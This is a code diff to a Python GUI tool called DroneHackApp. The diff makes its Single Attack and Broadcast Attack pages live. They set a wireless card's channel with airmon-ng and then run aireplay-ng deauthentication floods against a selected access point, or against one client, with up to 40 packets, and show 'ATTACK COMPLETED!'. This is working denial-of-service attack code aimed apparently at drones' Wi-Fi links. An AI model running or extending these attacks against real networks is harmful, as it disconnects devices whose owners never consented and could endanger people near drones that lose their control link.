@@ -32,11 +32,17 @@ class AccessPoint:
         else:
             return(" ")
 
-    def macAPtoString(self):
+    def getMACaddressAP(self):
         if self.counterAP != "0":
             return(self.BSSID)
         else:
             return(" ")
+
+    def getChannelAP(self):
+        return(self.channel)
+
+    def getCounterAP(self):
+        return(self.counterAP)
     
 
 class ClientComs:
@@ -58,12 +64,14 @@ class ClientComs:
         else:
             return(" ")
 
-    def macCCtoString(self):
+    def getMACaddressCC(self):
         if self.counterCC != "0":
             return(self.MAC)
         else:
             return(" ")
-    
+
+    def getCounterCC(self):
+        return(self.counterCC)
 
 class CurrentConfiguration:
     #current device configuration
@@ -179,15 +187,47 @@ class DroneHackApp(tk.Tk):
             frame.tkraise()
             #keyboard button handlers for each frame
             if page_name.__eq__("MainPage"):
+                self.bind('1', (lambda event: self.show_frame("StartPage")))
                 self.bind('2', (lambda event: self.show_frame("SettingsPage")))
                 self.bind('3', (lambda event: self.show_frame("AboutPage")))
                 self.bind('4', self.shut_down)
             elif page_name.__eq__("AboutPage"):
+                self.bind('1', (lambda event: self.show_frame("MainPage")))
+                self.unbind('2')
                 self.unbind('3')
+                self.unbind('4')
             elif page_name.__eq__("SettingsPage"):
+                self.bind('1', (lambda event: self.show_frame("MainPage")))
                 self.unbind('3')
+                self.unbind('2')
+                self.unbind('4')
+            elif page_name.__eq__("StartPage"):
+                self.bind('1', (lambda event: self.show_frame("MainPage")))
+                self.unbind('2')
+                self.unbind('3')
+                self.unbind('4')
+            elif page_name.__eq__("SelectionPage"):
+                self.bind('1', (lambda event: self.show_frame("ScanNetworkPage")))
+                self.bind('2', (lambda event: self.show_frame("SingleAttackPage")))
+                self.bind('3', (lambda event: self.show_frame("BroadcastAttackPage")))
+                self.bind('4', (lambda event: self.show_frame("MainPage")))
+            elif page_name.__eq__("ScanNetworkPage"):
+                self.unbind('1')
+                self.bind('2', (lambda event: self.show_frame("SelectionPage")))
+                self.unbind('3')
+                self.unbind('4')
+            elif page_name.__eq__("SingleAttackPage"):
+                self.unbind('1')
+                self.unbind('2')
+                self.bind('3', (lambda event: self.show_frame("SelectionPage")))
+                self.unbind('4')
+            elif page_name.__eq__("BroadcastAttackPage"):
+                self.unbind('1')
+                self.unbind('2')
+                self.bind('3', (lambda event: self.show_frame("SelectionPage")))
+                self.unbind('4')
 
-
+                
     def exit_full_screen(self, *args):
         if(self.attributes("-fullscreen")):
             self.attributes("-fullscreen", False)
@@ -882,11 +922,11 @@ class SingleAttackPage(tk.Frame):
 
         #DoS packets selection combobox
         self.selectedPacketsSAPCombo = ttk.Combobox(optionsSAPFrame,
-                                                    values = ["3 packets",
-                                                              "5 packets",
+                                                    values = ["5 packets",
                                                               "10 packets",
                                                               "20 packets",
-                                                              "30 packets"],
+                                                              "30 packets",
+                                                              "40 packets"],
                                                     state = "readonly",
                                                     width = 16,
                                                     font = controller.text_font)
@@ -940,7 +980,7 @@ class SingleAttackPage(tk.Frame):
             #display mac addresses in combobox
             macAddressStr = ""
             for CC in self.controller.listOfCC:
-                macAddressStr = CC.macCCtoString()
+                macAddressStr = CC.getMACaddressCC()
                 if macAddressStr not in self.selectedConSAPCombo['values']:
                     self.selectedConSAPCombo['values'] = (*self.selectedConSAPCombo['values'], macAddressStr)
             self.selectedConSAPCombo.current(0)
@@ -948,12 +988,56 @@ class SingleAttackPage(tk.Frame):
 
     def runSingleAttack(self):
         if len(self.controller.listOfCC) > 1:
-            print("OK")
-            print(self.selectedConSAPCombo.current())
-        #bash command for broadcast scan
-        #bashCommand = "aireplay-ng -0 10 -a " + selectedMAC + " -c " + selectedMAC2 + " wlan1mon"
-        #process = subprocess.Popen(bashCommand.split(), stdout = subprocess.PIPE)
-        #output, error = process.communicate()
+            if self.selectedConSAPCombo.current() > 1:
+                try:
+                    #get the amount of packets
+                    packetsSA = 5
+                    if self.selectedPacketsSAPCombo.current() == 0:
+                        packetsSA = 5
+                    elif self.selectedPacketsSAPCombo.current() == 1:
+                        packetsSA = 10
+                    elif self.selectedPacketsSAPCombo.current() == 2:
+                        packetsSA = 20
+                    elif self.selectedPacketsSAPCombo.current() == 3:
+                        packetsSA = 30
+                    elif self.selectedPacketsSAPCombo.current() == 4:
+                        packetsSA = 40
+                    packetsSA = str(packetsSA)
+
+                    #get network card
+                    selectedCardSA = str(self.controller.configurationSettings.getNICmon())
+
+                    #get MAC address of the client
+                    clientMAC = self.selectedConSAPCombo.get()
+
+                    #get MAC address of the access point
+                    accessPointMAC = " "
+                    for CC in self.controller.listOfCC:
+                        if CC.getCounterCC() == str(self.selectedConSAPCombo.current()):
+                            accessPointMAC = CC.getMACaddressCC()
+
+                    #get channel
+                    channelSA = 1
+                    for AP in self.controller.listOfAP:
+                        if AP.getMACaddressAP() == accessPointMAC:
+                            channelSA = AP.getChannelAP()
+
+                    #set card in the right channel
+                    bashCommandChannel = "airmon-ng start " + selectedCardSA + " " + channelSA
+                    process = subprocess.Popen(bashCommandChannel.split(), stdout = subprocess.PIPE)
+                    output, error = process.communicate()
+                    
+                                    
+                    #bash command for single DoS attack
+                    bashCommand = "aireplay-ng -0 " + packetsSA + " -a " + accessPointMAC + " -c " + clientMAC + " " + selectedCardSA
+                    process = subprocess.Popen(bashCommand.split(), stdout = subprocess.PIPE)
+                    output, error = process.communicate()
+                    self.detailsSAPText.delete(1.0, tk.END)
+                    self.detailsSAPText.insert(tk.END, output)
+                    self.detailsSAPText.insert(tk.END, "\nATTACK COMPLETED!\n")
+                except:
+                    self.detailsSAPText.delete(1.0, tk.END)
+                    self.detailsSAPText.insert(tk.END, "ERROR: Failed running a DoS command")
 
 
 class BroadcastAttackPage(tk.Frame):
@@ -1014,11 +1098,11 @@ class BroadcastAttackPage(tk.Frame):
 
         #DoS packets selection combobox
         self.selectedPacketsBAPCombo = ttk.Combobox(optionsBAPFrame,
-                                                    values = ["3 packets",
-                                                              "5 packets",
+                                                    values = ["5 packets",
                                                               "10 packets",
                                                               "20 packets",
-                                                              "30 packets"],
+                                                              "30 packets",
+                                                              "40 packets"],
                                                     state="readonly",
                                                     width = 16,
                                                     font = controller.text_font)
@@ -1074,72 +1158,59 @@ class BroadcastAttackPage(tk.Frame):
             #display mac addresses in combobox
             macAddressBAPStr = ""
             for AP in self.controller.listOfAP:
-                macAddressBAPStr = AP.macAPtoString()
+                macAddressBAPStr = AP.getMACaddressAP()
                 if macAddressBAPStr not in self.selectedConBAPCombo['values']:
                     self.selectedConBAPCombo['values'] = (*self.selectedConBAPCombo['values'], macAddressBAPStr)
             self.selectedConBAPCombo.current(0)
 
 
     def runBroadcastAttack(self):
-        if len(self.controller.listOfCC) > 2:
-            print("OK2")
-        #bash command for broadcast scan
-        #bashCommand = "aireplay-ng -0 10 -a " + selectedMAC + " wlan1mon"
-        #process = subprocess.Popen(bashCommand.split(), stdout = subprocess.PIPE)
-        #output, error = process.communicate()
+        if len(self.controller.listOfAP) > 2:
+            if self.selectedConBAPCombo.current() > 1:
+                try:
+                    #get the amount of packets
+                    packetsBA = 5
+                    if self.selectedPacketsBAPCombo.current() == 0:
+                        packetsBA = 5
+                    elif self.selectedPacketsBAPCombo.current() == 1:
+                        packetsBA = 10
+                    elif self.selectedPacketsBAPCombo.current() == 2:
+                        packetsBA = 20
+                    elif self.selectedPacketsBAPCombo.current() == 3:
+                        packetsBA = 30
+                    elif self.selectedPacketsBAPCombo.current() == 4:
+                        packetsBA = 40
+                    packetsBA = str(packetsBA)
 
+                    #get network card
+                    selectedCardBA = self.controller.configurationSettings.getNICmon()
 
+                    #get MAC address of the client
+                    accessPointMAC = self.selectedConBAPCombo.get()
 
-        '''
-        self.outputStPText = tk.Text(self, height=12, width=100, background = "blue")
-        self.outputStPText.grid(row = 0, column = 0, sticky = 'nsew')
-        
-        scanStPButton = ttk.Button(self,
-                                 text = "Scan for networks",
-                                 style = 'TButton',
-                                 command = self.start_thread)
+                    #get channel
+                    channelAP = 1
+                    for AP in self.controller.listOfAP:
+                        if AP.getCounterAP() == str(self.selectedConBAPCombo.current()):
+                            channelAP = AP.getChannelAP()
 
-        scanStPButton.grid(row = 1, column = 0, sticky = 'nsew')
-
-        testStPButton = ttk.Button(self,
-                                 text = "Emergency stop",
-                                 style = 'TButton',
-                                 command = self.stop_thread)
-        testStPButton.grid(row = 2, column = 0, sticky = 'nsew')
-
-    def start_thread(self):
-        _thread.start_new_thread(self.start_monitor_mode, ())
-
-    def stop_thread(self):
-        _thread.exit()
-        
-    def start_monitor_mode(self):
-        #bash command for network process kill
-        #bashCommand = "timeout 5 airodump-ng wlan1"
-        #process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
-        #output, error = process.communicate()
-        #x=0
-        #print(error)
-        #print(output)
-        testText = "Application test run"
-        self.outputStPText.insert(tk.END, testText)
-
-    def scan_networks(self):
-        #bash command for network scan
-        
-        bashCommand = "timeout 3 airodump-ng wlan1"
-        process = subprocess.check_output(["timeout", "3", "airodump-ng", "wlan1"]) #Popen(bashCommand.split(), stdout=subprocess.PIPE)
-        #output, error = process.communicate()
-        x=0
-        #print(error)
-        #print(output)
-        self.outputStPText.insert(tk.END, process)
-        print("Starting up Airodump-ng")
-        cmd_airodump = pexpect.spawn('airodump-ng wlan1 --output-format csv -w data')
-        cmd_airodump.expect([pexpect.TIMEOUT, pexpect.EOF], 5)
-        print("Airodump-ng Stopping...")
-        cmd_airodump.close()
-        '''
+                    #set card in the right channel
+                    bashCommandChannel = "airmon-ng start " + selectedCardBA + " " + channelAP
+                    process = subprocess.Popen(bashCommandChannel.split(), stdout = subprocess.PIPE)
+                    output, error = process.communicate()
+                                
+                    #bash command for broadcast attack
+                    bashCommandDoS = "aireplay-ng -0 " + packetsBA + " -a " + accessPointMAC + " " + selectedCardBA
+                    process = subprocess.Popen(bashCommandDoS.split(), stdout = subprocess.PIPE)
+                    output, error = process.communicate()
+                    self.detailsBAPText.delete(1.0, tk.END)
+                    self.detailsBAPText.insert(tk.END, output)
+                    self.detailsBAPText.insert(tk.END, "\nATTACK COMPLETED!\n")
+                      
+                except:
+                    self.detailsBAPText.delete(1.0, tk.END)
+                    self.detailsBAPText.insert(tk.END, "ERROR: Failed running a DoS command")
+                
 	
 if __name__ == "__main__":
     app = DroneHackApp()
